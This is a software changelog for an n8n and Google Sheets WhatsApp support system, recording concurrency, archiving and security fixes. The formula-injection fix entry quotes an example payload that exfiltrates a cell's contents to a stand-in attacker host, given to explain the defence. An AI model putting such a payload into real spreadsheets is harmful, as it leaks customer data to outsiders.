# Changelog

What was actually built and verified. Nothing is listed as working unless it was
executed and observed.

---

## [Unreleased] — Version 2, task V2-14 — The 24-hour window rule, in one place

### Added

- `scripts/lib/window.js`: `windowState({ last_customer_message_at, now })`
  says whether Meta's customer service window is open, how many whole hours
  are left, and when it closes. It is measured from the customer's last
  message only; a reply from the business never extends it. A missing or
  unreadable timestamp counts as closed, so an unknown state can cost a
  template, never a message Meta silently refuses. Nothing uses it yet: the
  send guard (V2-20) and the sheet's window column (V2-13) will.
- `tests/window/window.test.js` (10 tests): 23h59m open, 24h00m closed,
  rounding, `+03:00` and `Z` read alike, missing and unreadable timestamps, a
  clock running ahead.

---

## [Unreleased] — Version 2, task V2-06 — Customer text is never a formula

### Fixed (security)

- **A customer could put a live formula into the team's sheet.** Every write is
  `USER_ENTERED` (n8n's Google Sheets node v4.7 default; nothing overrode it),
  so Sheets parsed each value as if someone typed it. A message such as
  `=IMPORTDATA("https://attacker.example/?"&A2)` landed as a working formula in
  `last_message`, `unanswered_messages` and Messages; a WhatsApp profile name is
  customer-controlled too. Every value a workflow writes now goes through one
  guard, `SHEET_SAFE_JS`: a string starting with `=`, `+`, `-`, `@`, a tab or a
  carriage return gets a leading apostrophe, which Sheets keeps as text and does
  not show. Numbers and booleans are untouched.
- The build applies it to every Google Sheets node and every API append, so a
  node added later cannot skip it.

### Added

- `validate-workflows.js`: every written value and every API append row must go
  through the guard. Removing it from one column fails the build.
- `tests/build/sheet-safe.test.js` (42 tests), including a hostile message sent
  through a real generated append.
- `docs/SECURITY.md`: the threat, and why the fix is not a switch to `RAW`.

### Not yet verified

- A message `=1+1` sent to the local stack, and seen in the sheet as `=1+1`.

---

## [Unreleased] — Version 2, task V2-05 — One deleter, deleting by id, checked

### Fixed

- **Rows were deleted by a row number read at the start of the run.** Workflow
  8 runs every minute and deleted each archived row by the `row_number` it had
  read, one request per row, while the other workflows kept writing. Deleting a
  row shifts every row below it, so a row that moved in the meantime could be
  deleted instead of the archived one. Now the rows are found by
  `conversation_id` in a read taken right before the delete, removed in one
  `batchUpdate` from the bottom up, and the tab is read again: an archived id
  still present is logged, and a row that vanished without being archived is
  appended back from the read taken just before (`ARCHIVE_ROW_RESTORED` in the
  Log). The logic is `scripts/lib/rows.js`.
- **Two things deleted archived rows.** The optional installable trigger in
  `SheetTools.gs` moved a row to Archive the moment someone chose `ARCHIVED`,
  and its "Archive selected rows" menu item did the same, while workflow 8
  deleted the same rows every minute. Each delete shifted the rows under the
  other. The script now only marks rows `ARCHIVED` and says they will move
  within a minute; workflow 8 is the only deleter.
- The operating guide suggested archiving by cutting rows and pasting them into
  Archive, which moves rows under the system's writes. It now says to mark them
  `ARCHIVED`.
- Workflow 8's canvas note said it ran nightly at 03:00 into a tab called
  `Conversations_Archive`. It runs every minute, into `Archive`.

### Safe without a service account

The new delete needs the Sheets token. A deployment with no service account in
`.env` keeps the old per-row delete, behind an IF, rather than copying the same
rows to Archive every minute without ever removing them.

### Found by the tests while building

The first version of the check would have re-appended rows that were still in
the tab whenever the second read came back empty, because as many rows looked
"lost" as had been deleted. A misplaced delete always leaves its intended row
behind, so a row is now restored only when it is matched by an archived row
still present.

### Added

- `validate-workflows.js`: a per-row Sheets delete runs only behind the no-token
  output of an IF; every API delete is planned by `planDeletes` and checked by
  `checkDeletes`. The previous workflow 8 fails it.
- `tests/archive/rows.test.js` (17), `tests/build/archive-workflow.test.js` (9,
  the generated code through a whole run) and
  `tests/build/apps-script-rules.test.js` (5: no `.gs` file deletes, moves or
  inserts rows; the previous `SheetTools.gs` did).

### Not yet verified

- `verify-archive.js` against the test spreadsheet, with and without a service
  account in `.env`.

---

## [Unreleased] — Version 2, task V2-04 — Replies from the sheet go to the right row, once

### Fixed

- **Several replies typed in the same minute were sent again and again.**
  `Interpret Sheet Send` read only `$input.first()`. Every reply of the poll was
  sent, but only the first had its outcome written and its cell cleared. The
  rest were sent again the next minute, and the next, until each had its turn at
  being first: a customer could receive the same reply several times. It now
  answers for every reply, each paired to its own request. Run against the old
  generated code, three replies produced one outcome.
- **A reply's outcome was written by row number.** A row number goes stale the
  moment anything above it moves (a delete, a sort, a row inserted by hand), and
  the outcome, the cleared cell and the new status then landed on another
  customer's row. A row that has a `conversation_id` is now written back by that
  id. Only a hand-typed row, which has no id yet, is written by row number, in a
  `Claim Row` node that gives it its id and the normalised phone. The same split
  applies to invalid replies.
- `N8N_WORKFLOWS.md` said the workflow skipped rows by `reply_status` and kept
  the text when Meta refused a send. Neither was true. It now describes what
  happens.

### Added

- `validate-workflows.js`: Conversations may be written by row number only in a
  `Claim Row` node behind the no-id output of an `is_manual` IF. The previous
  workflow 7 fails it on both of its writes.
- `tests/build/reply-from-sheet.test.js` (12 tests), run on the generated code.

### Not yet verified

- Two sheet replies in the same minute, and a hand-typed row, against the test
  spreadsheet.

---

## [Unreleased] — Version 2, task V2-03 — The system no longer moves rows to sort them

### Changed

- **Workflow 3 no longer sorts the Conversations and Messages tabs.** It did so
  after every new conversation to keep the newest at the top. A sort moves
  rows, and n8n's update reads the key column and then writes to the row index
  it found, so an update resolved just before a sort landed on another
  customer's row: status, last message or reply cell overwritten, with nothing
  failing. The four sort nodes are gone.
- **Newest first is a filter view now.** `apply-sheet-layout.js` creates
  `Newest first` on Conversations (sorted by `last_activity_at`, descending),
  and updates it in place when re-run. A filter view orders what one person
  sees and moves no row. New rows are appended at the bottom of the tab itself.
- The operating guide and the schema document said to sort the tab to work the
  queue. They now say to sort inside a filter view, and never the tab itself.

### Added

- `validate-workflows.js`: no workflow may send `sortRange`, `moveDimension` or
  `insertDimension`. The previous workflow 3 fails it.

### Not yet verified

- Running `apply-sheet-layout.js` against the test spreadsheet, and confirming
  that sorting inside the view leaves the order the API reads unchanged (spike
  S3 in the V2 plan).

---

## [Unreleased] — Version 2, task V2-02 — A full team no longer loses messages

Ported from the `add-waha-connector` branch (`e5fdaec`), where it was found
from a failed execution in n8n's own database.

### Fixed

- **At full capacity, a new customer's message was written nowhere.** With
  every agent at `max_open_conversations`, Select Agent correctly decides
  `WAITING_FOR_AGENT` with no agent, but it fed "Increment Agent Load" anyway.
  The Sheets update refuses an empty match value, and since failures stop the
  workflow, the parallel branch that writes the conversation row stopped too.
  A new IF, `Agent Assigned?`, now gates only the Agents update; the row is
  written on every path, and workflow 5 assigns it later.
- `Read Agents` in workflows 3 and 5 ran once per input item: one run read the
  Agents tab 16 times. In workflow 5 the duplicate agent copies could also push
  an agent past capacity. Both now read once (`executeOnce`).
- Workflow 3's canvas note told operators to set
  `N8N_CONCURRENCY_PRODUCTION_LIMIT=1`, the setting 0.6.0 proved drops
  messages, and named workflow 7 as the queue retry. It now says the opposite,
  and names workflow 5.

### Added

- `validate-workflows.js`: "Increment Agent Load" may only be fed by the true
  output of `Agent Assigned?`. Proven by wiring it back to Select Agent on
  purpose.

### Not yet verified

- `scenario-multi-agent.js` with every agent at capacity, on the local stack.

---

## [Unreleased] — Version 2, task V2-01 — Appends that cannot overwrite each other

The limitation left open in 0.6.0 is closed in the build. The live burst test
has not been run yet: it needs a test spreadsheet and the local stack, which
were not available when this was built.

### The cause, read from n8n's source

`appendViaApi()` was written in 0.6.0 and never called, so every append still
went through n8n's Google Sheets node. In n8n 2.38.5 that node reads the sheet,
works out the next free row, and writes to it. Two executions arriving together
work out the same row. Its "Minimise API Calls" option calls `values.append`,
but without an `insertDataOption`, which means `OVERWRITE`, and that collides
the same way.

### Changed

- `build-workflows.js` rewrites every Google Sheets append (ten nodes, six
  workflows) into an API append with `insertDataOption=INSERT_ROWS`, keeping the
  original node's name. The Sheets node stays as `Fallback: <name>` on the API
  append's error output, so a deployment without a service account, or a failed
  call, still writes the row.
- Values are placed **by column name** against the live header row, so the
  documented promise that inserting or moving a column breaks nothing still
  holds.
- Every value is still sent as text with `USER_ENTERED`, which is what the
  Sheets node did (v4.7's default), so cells keep their types.
- An access branch hangs off each trigger and runs first. It ends in
  `Sheets Access`: a token, reused until five minutes before it expires, and
  the header rows, re-read at most once a minute. Both are cached in the
  workflow's static data, which n8n 2.38.5 also saves for sub-workflow runs, so
  a typical run makes no extra request. Workflow 3's sort uses the same token.
- `docker-compose.prod.yml` and `.env.prod.example` now pass
  `GOOGLE_SERVICE_ACCOUNT_EMAIL` and `GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY`. They
  were missing, so in production the sort had always been skipped silently.

### Added

- `validate-workflows.js`: no Sheets-node append except as a fallback; every API
  append uses `INSERT_ROWS` and `USER_ENTERED`, falls back, and places values by
  name; the access branch is complete and is the trigger's topmost child. Each
  rule was checked by breaking a generated file on purpose.
- `tests/build/append-via-api.test.js` (28 tests): the rewrite, and the body of
  every generated append evaluated to a full row.
- `tests/build/access-branch.test.js` (10 tests): the generated access-branch
  code, run with stand-ins for n8n, signing with a real RSA key.

### Not yet verified

- `scripts/testing/verify-burst.js` against a running stack with a test
  spreadsheet.
- A server upgrade needs the two variables added to its own compose file, which
  is maintained by hand.

---

## [0.6.0] — 2026-09-13 — Messages that arrived and were never seen

A burst test found the worst bug in this system so far, and most of it is fixed.

### The symptom

Two webhooks posted at the same instant each returned HTTP 200. Both executions
ran. Both were logged green. One customer's message was nowhere: no conversation
row, no message row, no log entry, no error. Nothing to notice, nothing to
alert on, nothing to retry.

### The cause, measured

Against the Google Sheets API with n8n entirely out of the picture:

| `insertDataOption` | Simultaneous appends | HTTP 200s | Rows |
|---|---|---|---|
| `OVERWRITE` (the default) | 6 | 6 | **3** |
| `INSERT_ROWS` | 6 | 6 | 6 |

`values.append` picks its target row from the table's current extent. Two calls
arriving together compute the same target, and the second overwrites the first.

Three further causes contributed, each a limit that DROPPED rather than queued:

**The handoff was fire-and-forget.** Workflow 1's Execute Workflow node ran
without waiting, so the parent execution ended before the sub-workflow had
started. It waits now — the ack goes out two nodes earlier, so waiting costs
Meta nothing.

**`N8N_CONCURRENCY_PRODUCTION_LIMIT=1`**, which this project's own documentation
recommended, discarded everything over the limit. It was there to serialise
assignment, because Google Sheets has no compare-and-set. It did — by losing
messages. Now `-1`, with duplicates folded back together by workflow 8 instead.
Four documents corrected.

**Eleven Sheets nodes swallowed their errors.** `continueErrorOutput` with
nothing wired to the error output does not handle a failure: the branch ends and
n8n records the execution as a SUCCESS. Every write that records a conversation
or a message was set that way. They fail loudly now, and
`validate-workflows.js` rejects that shape so it cannot return.

Every Sheets node also retries three times, two seconds apart — the quota is 60
reads a minute for one service account, and a node that fails once loses that
message for good.

### What remains

The append collision itself. The fix is proven but n8n's Sheets node does not
expose `insertDataOption`, so the two appends that can lose a customer message
must call the API directly. Written up in
[ARCHITECTURE.md](docs/ARCHITECTURE.md#messages-arriving-at-the-same-instant).

Normal traffic is unaffected — messages a second or more apart all land, and
`verify-live.js` and `verify-archive.js` pass in full.

### Added

- `scripts/testing/verify-burst.js` — posts a burst and insists every message is
  present. It fails today, deliberately: it is how the remaining fix gets
  confirmed.
- `scripts/testing/show-sheet.js` — prints the live sheet from a terminal,
  read-only. Every diagnosis in this release started by reading the sheet.
- Workflow 8 folds duplicate conversations back together: same customer, same
  business number, two open rows. The oldest wins, because it holds
  `first_message_at`.

---

## [0.5.2] — 2026-09-13 — Documentation that cannot quietly go stale

### Added — `scripts/validation/check-docs.js`

Twenty-six checks over the 26 markdown files. Documentation rots quietly, and a
document that is confidently wrong is worse than none: the reader has no way to
tell which parts still hold. This checks what can be checked mechanically —
every relative link resolves, every count of tests, checks, columns and
workflows matches a real run, nothing still points at a removed file, every
script is mentioned somewhere, and the prose is English with no tool branding.

It found, and this release fixes:

- four documents quoting 169 or 186 unit tests when there are 192, and three
  quoting 424 workflow checks when there are 461
- a changelog entry linking to `docs/MVP_WORKFLOW.md`, deleted in 0.4.0
- three scripts nothing documented: `deploy-vps.sh`, `scenario-multi-agent.js`,
  and the checker itself

### Fixed — documentation that described behaviour the system no longer has

`N8N_WORKFLOWS.md` still called `reply_status` the interlock against
double-sending. It has not been since 0.4.0: clearing `reply_text` is the
interlock, and treating the status as a guard was what silently dropped messages
from anyone who set it to `SENT` themselves.

`ENVIRONMENT.md`, `ERROR_HANDLING.md` and `GOOGLE_SHEETS_SCHEMA.md` still said
timestamps are stored in UTC and always `Z`-suffixed. Since 0.4.0 they carry an
explicit offset in the business timezone — which is not the DST hazard the old
text warned about, because the offset travels with the value.

`TESTING.md` had a scenario table marking seven behaviours "not executed — needs
credentials". All seven have since been executed against the live deployment,
including a real WhatsApp send and both archiving paths.

### Changed — the README says what the system is for

It opened by naming its own technology. It now opens with the problem: one phone
holding every conversation, nobody able to see who is still waiting, two people
answering the same customer or nobody. Then what the team gets instead, who it
is for, and only then how it is built.

---

## [0.5.1] — 2026-09-11 — Archiving, proved

### Added — `scripts/testing/verify-archive.js`

Seventeen checks against the running deployment. Archiving is the only
operation that deletes from Conversations, and the risky part is a batch:
deleting a row shifts every row beneath it, so a sweep that does not delete
bottom-up removes the wrong rows — from the one tab whose entire job is not
losing anything.

The script archives two of three conversations at once and asserts the third is
still there, unchanged, and not in Archive. It covers both ways a row leaves —
someone setting `status` to `ARCHIVED`, and the unattended sweep of a
conversation `CLOSED` longer than `ARCHIVE_AFTER_DAYS` — and checks that every
column survives the move, including `product` and `quantity`, which only a human
ever writes. All seventeen pass.

### Added — `scripts/testing/clean-test-rows.js`

Removing fixtures used to be a one-liner matching synthetic phone numbers with a
regex. `9627[0-9](1[0-9]|21|55)[0-9]{5}` also matched a real customer's number
and deleted 46 genuine message rows. Nothing in a phone number says whether it
is real, so the cleaner now matches the **names** the verification scripts
write, and removes messages only when they belong to a conversation it is
already removing. `--dry-run` first, always.

---

## [0.5.0] — 2026-09-11 — Nothing a customer said goes unseen

### Added — the messages nobody has answered

`Conversations` holds one row per CUSTOMER, so `last_message` shows only the
latest thing they said. A customer who wrote three times before anyone replied
left two messages invisible on the tab people actually work in — present in
`Messages`, but not where "have we answered them" gets decided.

`unanswered_messages` now carries everything still owed a reply, newest first,
in one cell. It grows with each inbound message and is cleared the moment a
reply goes out. A reply that **failed** leaves it alone, because nothing was
answered. `unanswered_count` is the same thing as a number, so the queue can be
sorted by who has waited longest.

Verified live: five messages from one number accumulated in the row, and a real
WhatsApp reply cleared it and moved the status to REPLIED.

### Fixed — a hard-coded column list

`build-workflows.js` held the Conversations header as a literal array. Adding a
column to the template changed the sheet but not the workflows, so the new
columns appeared in the tab and were written as empty cells with nothing to say
why. It reads the template now, the way the Messages list already did.

### Fixed — column visibility followed positions, not names

The layout script only ever added the hidden flag, so reordering a tab left the
old positions hidden while different columns had moved into them. That is how
`status` disappeared from Conversations — a column with a dropdown, a colour
rule and live data, invisible. Visibility is now set explicitly, both ways, for
every column on every run.

---

## [0.4.0] — 2026-09-11 — Live, verified end to end

The system now runs against real Meta and real Google credentials on a Hostinger
VPS, and `scripts/testing/verify-live.js` proves it: **28 checks passing**,
including a real WhatsApp message sent from the spreadsheet.

### Fixed — three bugs that only the live sheet revealed

**A Sheets append was creating columns.** `autoMapInputData` adds a column for
every top-level field it does not recognise, and the item at that point carried
the whole pipeline context. The live `Conversations` tab had grown from 26
columns to 67, with fields like `phone_normalized_ok` sitting in it as real
columns. Every conversation write now maps its columns explicitly, and the
workflow validator fails the build if an append uses auto-mapping.

**An update was blanking the row it updated.** With an explicit column map, an
expression that resolves to `undefined` writes an *empty cell*; it does not mean
"leave this alone". A follow-up message from a customer therefore erased their
name, phone and assigned agent — which is why the assigned agent appeared to
change on every message. Updates now carry the whole row: the values already in
the sheet, with the changed fields laid over them.

**Nodes were reading `$json` after a Sheets write.** A Sheets node emits the row
it wrote, not the item that went in, so `$json.message_id` downstream was
`undefined`. `Messages` rows contained only a direction and `Log` rows had a
status in `event_type`. Those nodes now read from a named source node, declared
in one place in the build script.

### Fixed — the send-from-sheet trap

`reply_status` was treated as a guard: a row whose status was `SENT` was skipped.
Setting it to `SENT` is the obvious way for a person to say "send this", and
doing so silently dropped the message. **A non-empty `reply_text` is now the
only instruction needed.** Double-sending is prevented by clearing the cell when
the message goes out, not by a status.

The outcome is also written back to the **physical row** the text came from, so
a hand-typed row for a number that already exists no longer updates the wrong
one.

### Fixed — publishing took the webhook offline

`import:workflow` writes the draft of every workflow it touches, unpublishing
all of them. Publishing only the edited workflow left `GET /webhook/whatsapp/webhook`
returning 404. `scripts/setup/import-workflows.js` now republishes all eight
every time.

### Changed — timestamps are local time

Every timestamp goes through `localIso()` in the new `scripts/lib/time.js`:
ISO-8601 in the timezone `TZ` names, with the offset attached. The sheet was
showing 15:57 for a message that arrived at 18:57, next to n8n's own expression
timestamps which were already local. The offset travels with the value, so no
timestamp is ambiguous.

### Added — `scripts/setup/apply-sheet-layout.js`

One command applies the whole sheet layout: six tabs in order, canonical
columns, dropdowns, colours by value, column widths, hidden system columns, and
a note on each tab's A1 explaining what the tab is for. Safe to re-run — rows
are re-mapped by column name — and it stops rather than migrating if row 1 does
not look like a header.

This replaces the pasted-by-hand Apps Script as the setup path.
`sheets-templates/SheetTools.gs` is still there for the in-sheet menu, but
nothing depends on it: archiving, dropdowns and colours all work without it.

### Added — `scripts/testing/verify-live.js`

End-to-end verification against the running deployment: signed webhooks over
HTTPS, then reading the real spreadsheet. Signature enforcement, conversation
creation, assignment, stickiness, idempotency, reply-from-sheet, archiving and
column drift. `--real-send=<E.164>` additionally sends one genuine WhatsApp
message.

### Added — `docs/CLIENT_ONBOARDING.md`

What to ask a client for, what the system costs to run, and whether it has to be
a VPS. Every figure checked against the vendor's own documentation.

### Changed — the Conversations tab

Reordered so the columns a person reads come first, and `last_message_type` was
added: a row reading `image` with no text is a customer who sent a photo, not
one who sent nothing. `Archive` mirrors it exactly, plus `archived_at`, enforced
by the schema checker.

### Removed — the MVP workflow and the request classifier

`00-mvp-inbound.json` was a second, parallel implementation of workflows 1-3 on
its own webhook path. Meta never pointed at it, the `Categories` tab it needed
did not exist in the live spreadsheet, and it was the single largest source of
"why are there so many files". Removed with `scripts/lib/classify.js`,
`tests/classify/`, `tests/mvp/`, `docs/MVP_WORKFLOW.md` and
`sheets-templates/Categories.csv`.

The entry for [0.3.0] below describes them as they were when they were built.
It is left as written — it is a record of what happened, not a description of
the current system.

---

## [0.3.0] — 2026-09-11 — One-workflow MVP, request classification

### Workflow 0 — the whole inbound path in one workflow

Workflows 1, 2 and 3 split receive / parse / resolve across three workflows
joined by Execute Workflow calls. `00-mvp-inbound.json` does the same work in
one: 23 nodes instead of 44, and no sub-workflow hops.

It does not replace anything. Its own workflow id (`whatsappMvp00001`), its own
webhook path (`/webhook/whatsapp/mvp`), and it only ever READS the `Agents` tab.
Both it and workflows 1-8 can be imported and active at once; Meta posts to one
URL, so only that one works. Full detail in `docs/MVP_WORKFLOW.md`.

### Agent load is counted, not stored

Workflow 3 increments `Agents.open_conversations`, which Google Sheets cannot do
atomically — hence its `concurrency: 1` and the Apps Script's repair tool.

Workflow 0 counts open conversations from the `Conversations` rows it has
already read. No second copy of the truth, so nothing to drift and no write to
serialize. `countOpenConversationsByAgent()` and `withLiveLoad()` are additive:
workflow 3 is untouched and still uses the counter.

Within one batched webhook the count is incremented in memory as each assignment
is made, so two customers in a single POST are not both handed to the same idle
agent.

### Request classification from a `Categories` tab

New `scripts/lib/classify.js`, plus a `Categories` tab and a `category` column on
`Conversations` and `Messages`. Both columns are appended at the END of their
header rows, so no existing data shifts and workflows 1-8 ignore them.

The category list lives in the sheet, not the code: the business adds a product
line by adding a row. Arabic is normalized before matching (diacritics stripped,
alef / teh-marbuta / alef-maksura variants unified, Arabic-Indic digits
converted), so one keyword covers the ways people actually type it. Arabic
keywords match as substrings because the definite article is written joined to
the noun; Latin keywords match whole words, or a keyword like `ac` would match
`back`.

The subtle part: messages with no words are NOT classified. An image with a
caption is classified on its caption, but a bare location is not — its preview
reads `[location] …`, and matching that would file a confident false positive
into whatever category owns the keyword `location`.

### A silent data-loss path, found by running it

The first build used `onError: continueErrorOutput` on the Sheets writes with
nothing wired to the error branch — the same pattern as workflow 3. Run against
a live n8n with no Sheets credential, `Append Conversation` "finished" in 2 ms,
wrote nothing, and the execution was logged as `n8n.workflow.success`.

The three data writes and the two reads whose empty result would be
*indistinguishable from a true answer* (`Read Conversations` → "new customer,
every agent idle"; `Read Agents` → "nobody works here") now use
`onError: stopWorkflow`. The same request now records `n8n.workflow.failed`.

`Read Categories`, `Lookup Duplicate` and `Audit Decision` stay non-fatal on
purpose: an unclassified message, a duplicate row, or a lost audit line are all
recoverable, where dropping a customer's message is not.

### Verified live against n8n 2.38.5

Handshake with the correct token (200 + challenge echoed), with the wrong token
(403), unsigned POST (401, fails closed), signed POST (200 `EVENT_RECEIVED`),
and the full node graph executing in order. The Sheets writes themselves still
need a service account, same as the rest of the project.

### Tests: 174 -> 231

- `tests/classify/classify.test.js` (22) — normalization, matching, tie-breaks,
  and the cases where it must refuse to guess
- `tests/assignment/live-load.test.js` (12) — including a drifted counter
  routing to the wrong agent where the live count routes correctly
- `tests/mvp/resolve-node.test.js` (23) — extracts the decision node's
  **generated JavaScript** from `00-mvp-inbound.json` and runs it against the
  real Meta fixtures with `$()` and `$env` stubbed. This is the layer that
  catches composition bugs: one test asserts the stored phone is the normalized
  one, because the event carries a raw `customer_phone` that maps to the same
  sheet column and would win if the event were spread into the row.

---

## [0.2.0] — 2026-09-10 — Coexistence, sheet replies, archiving

### Coexistence: app replies are no longer invisible

Version 0.1.0 documented as a permanent platform limitation that a reply typed
in the WhatsApp Business App could never be seen, leaving conversations stuck
on `UNANSWERED` even after the customer was answered.

**That was wrong.** Meta shipped Coexistence in May 2025: the Business App and
the Cloud API share one number, and app-sent messages are mirrored to the
webhook as `smb_message_echoes`.

- Parser now emits `kind: 'echo'` with `sent_via = whatsapp_business_app`
- Workflow 2 gained a fourth branch applying echoes through the same
  `buildAgentMessageUpdate()` used for API replies
- `revoke`/`edit` echoes are recorded but do not advance conversation state —
  deleting a message is not answering a customer
- 7 new unit tests, 2 new fixtures
- `docs/ARCHITECTURE.md` corrected; `docs/COEXISTENCE.md` added

The subtle part: in an echo, `from` is the **business** and `to` is the
**customer** — reversed from a normal message. A test asserts the correct
attribution, because reading it the usual way would file an agent's own reply
under the business number and flip the real conversation to `UNANSWERED`.

### Workflow 7 — Reply From Sheet

Type into a conversation's `reply_text` cell; within a minute it is sent over
the Cloud API and the cell is cleared. `reply_status` is the interlock that
prevents every poll resending the same text. On failure the text is kept so the
author can correct it.

### Workflow 8 — Archive Old Conversations

Nightly at 03:00, moves conversations `CLOSED` longer than
`ARCHIVE_AFTER_DAYS` (default 30) into `Archive`.

Three safety rules: only `CLOSED` rows; copy-before-delete with
`onError: stopWorkflow` on the copy so a failed copy can never be followed by a
delete; and delete bottom-up, because removing a row shifts every row beneath
it and top-down deletion would delete the wrong conversations.

### Also added

- `sheets-templates/SetupSheet.gs` — one-click Google Sheets setup: all tabs,
  checkboxes, status dropdown, colour rules, and a **WhatsApp Support** menu
  (reply dialog, bulk close/reopen, agent-workload recalculation)
- `scripts/validation/check-schema-consistency.js` — column names live in the
  CSVs, the Apps Script and the workflow JSON; if they drift, a workflow writes
  to a non-existent column, Sheets accepts it, nothing errors, and the data
  lands nowhere. Verified it catches a planted mismatch.
- `scripts/setup/cleanup-stale-workflows.js` — the n8n CLI has no delete
  command; this uses the REST API, dry-run by default
- `concurrency: 1` pinned into workflow 3's generated JSON rather than relying
  on someone setting it in the UI
- `sent_via` column on `Messages`, distinguishing
  `cloud_api` / `whatsapp_business_app` / `google_sheet`
- New config: `ASSIGNMENT_STRATEGY`, `REOPEN_CLOSED_CONVERSATIONS`,
  `ARCHIVE_AFTER_DAYS`, `ARCHIVE_BATCH_SIZE`
- `docs/OPERATING_GUIDE.md` — the three reply paths, latency, filtering, and
  what actually determines response time

### Added — core logic (`scripts/lib/`)

All I/O-free and unit-tested; inlined into n8n Code nodes at build time so the
tested code and the running code are identical.

- **`phone.js`** — E.164 normalization. Jordan local/international forms,
  Arabic-Indic digit transliteration, formatting stripped. Ambiguous numbers are
  **flagged, not guessed**; a strict variant refuses them outright for outbound
  sends. Never returns a malformed `wa.me` URL.
- **`assignment.js`** — `LEAST_OPEN_CONVERSATIONS` with a documented
  tie-breaker chain (fewest open → earliest `last_assigned_at` → lowest
  `agent_id`). Pluggable `ROUND_ROBIN`. Fails closed on unrecognized
  availability values; one malformed row cannot break routing for everyone.
- **`webhook-parser.js`** — Meta payload parsing. Flattens **every**
  entry/change/message so batched webhooks are not silently truncated. Handles
  13 message types plus unknown ones without throwing.
- **`conversation.js`** — five-state lifecycle machine, conversation identity,
  and row/update builders. Inactivity eligibility (does not auto-close).
- **`security.js`** — GET verify handshake, `X-Hub-Signature-256` HMAC over raw
  bytes, constant-time comparison, recursive secret redaction. Fails closed
  everywhere.
- **`idempotency.js`** — dedupe keys (distinct for messages vs statuses),
  monotonic status ladder, TTL-bounded advisory lock, correlation ids.

### Added — n8n workflows

Generated by `scripts/setup/build-workflows.js`; ids pinned so imports upsert.

1. **Webhook Receiver** — verify, authenticate, ack in <100 ms, hand off
2. **Incoming Message Processor** — parse, deduplicate, route three ways
3. **Conversation & Assignment** — lookup/create, select agent, persist, audit
4. **Outgoing Agent Message** — the only supported reply path
5. **Unassigned Queue Retry** — drains `WAITING_FOR_AGENT`, oldest first
6. **Error Handler** — records failures with credentials redacted

### Added — tooling

- `scripts/setup/build-workflows.js` — generates workflows, inlining library
  source; `--check` detects staleness
- `scripts/setup/import-workflows.js` — idempotent import with a readiness report
- `scripts/validation/validate-workflows.js` — 414 checks including JavaScript
  compilation of every Code node and a hard-coded-secret scan
- `scripts/validation/check-env.js` — configuration completeness; **never prints
  a secret value**
- `scripts/testing/send-fixture.js` — sends fixtures signed exactly as Meta
  signs them
- `tests/run-tests.js` — zero-dependency runner

### Added — fixtures and templates

8 Meta payload fixtures (text, image, location, unsupported type, batched
multi-number, delivered, failed, malformed) and 4 Google Sheets CSV templates.

### Added — documentation

19 documents. `TESTING.md` distinguishes verified from unverified;
`ASSIGNMENT_ALGORITHM.md` documents the Google Sheets race honestly rather than
claiming it is solved.

---

## [0.1.0] — 2026-09-10 — MVP

First working version. Receives WhatsApp webhooks, verifies them, parses them,
and routes conversations to agents.

### Verified working

Executed and observed, not inferred:

| Capability | Evidence |
|---|---|
| n8n 2.38.5 running with persistent volume | `/healthz` → 200; survived ~10 restarts with no data loss |
| Explicit `N8N_ENCRYPTION_KEY` | Container starts clean; zero mismatch errors |
| Meta GET verification handshake | Correct token → `200` + challenge echoed; wrong token → `403` |
| HMAC signature verification | Signed → `200 EVENT_RECEIVED`; bad sig → `401`; no sig → `401` |
| All 10 webhook fixtures accepted | `200` each, including the malformed payload |
| Receiver → Processor handoff | No `Workflow is not active` errors after publishing |
| All 8 workflows imported and published | `n8n list:workflow` shows 8/8 with pinned ids |
| Idempotent import | Two consecutive imports produced no new workflows |
| Business logic | **169 unit tests passing** |
| Workflow structure | **414 validation checks passing** |
| Sheet schema consistency | **10 checks passing**; verified against a planted mismatch |
| No secrets in workflow JSON | Validator scans 5 secret patterns; 0 findings |
| No secrets in git | `.env` confirmed ignored; `git ls-files` shows 0 matches |

### Not verified — needs credentials

Built and structurally validated, but **not run against live APIs**:

- Google Sheets read/write (needs a service account)
- Outgoing messages via Cloud API (needs a Meta access token)
- Real end-to-end flow with a live WhatsApp number
- Delivery/read status progression from real Meta callbacks
- Reply-from-sheet (workflow 7) — sending, cell clearing, the double-send guard
- Nightly archiving (workflow 8) — copy, delete, audit
- Live Coexistence echoes (the parsing is unit-tested against fixtures, but no
  real WhatsApp Business App message has been observed)

---

## Bugs found and fixed during development

Recorded because each one was found by actually running the system, and each
would have failed in production:

| Bug | How it was found | Fix |
|---|---|---|
| **HMAC read the wrong field** — signature verification returned `401` on correctly signed payloads | Sending a real signed HTTP request | n8n puts raw bytes base64-encoded in `binary.data.data`, not `json.body`. The parsed body is a different byte sequence |
| **Duplicate `const crypto`** — Code node failed to parse when two libraries were inlined together | Workflow validator | Builder now hoists built-in requires and emits each once |
| **Every import created duplicates** — 18 workflows after 3 imports | `n8n list:workflow` | Pinned stable workflow ids so import upserts |
| **Wrong fixture timestamps** — epoch values were 2025, not 2026 | Unit test assertion failing | Recomputed all fixture timestamps |
| **UTF-8 BOM broke `.env`** — first variable name became `﻿N8N_ENCRYPTION_KEY` | Byte inspection | Stripped the BOM; documented the PowerShell cause |
| **`$env` blocked** — webhook returned `500` | Container logs: `access to env vars denied` | n8n 2.x blocks `$env` by default; set `N8N_BLOCK_ENV_ACCESS_IN_NODE=false` |
| **Deprecated `WEBHOOK_URL`** | Startup deprecation warning | Renamed to `N8N_WEBHOOK_URL` |
| **Obsolete `N8N_RUNNERS_ENABLED`** | Startup warning | Removed |
| **CLI hang on publish** — ran 6 minutes before being killed | Process inspection | Piping `n8n publish:workflow` into `head` causes SIGPIPE. Never pipe it |

### Environment findings worth remembering

- `import:workflow --activeState=fromJson` requires queue or multi-main mode; it
  errors in a regular single-instance deployment
- n8n 2.x uses a **draft/published** model — sub-workflows called via Execute
  Workflow must be published too, or the caller fails
- The n8n CLI has **no delete command**; deletion requires the REST API or the UI

---

## Known issues

| Issue | Impact | Status |
|---|---|---|
| 18 stale workflow copies in the local n8n | Cosmetic; they are inert and unpublished | `scripts/setup/cleanup-stale-workflows.js` (needs an n8n API key), or delete in the UI |
| Google Sheets persistence unverified | Unknown until credentials exist | Blocked on a service account |
| Outgoing send unverified | Unknown until credentials exist | Blocked on a Meta token |
| Assignment race with multiple n8n instances | Double-assignment possible | Mitigated by concurrency 1; real fix is PostgreSQL |
| Replies from a **personal** WhatsApp account are invisible | That reply is not recorded | Platform constraint — Coexistence tracks the business number, not the person |

---

## Deliberately not built

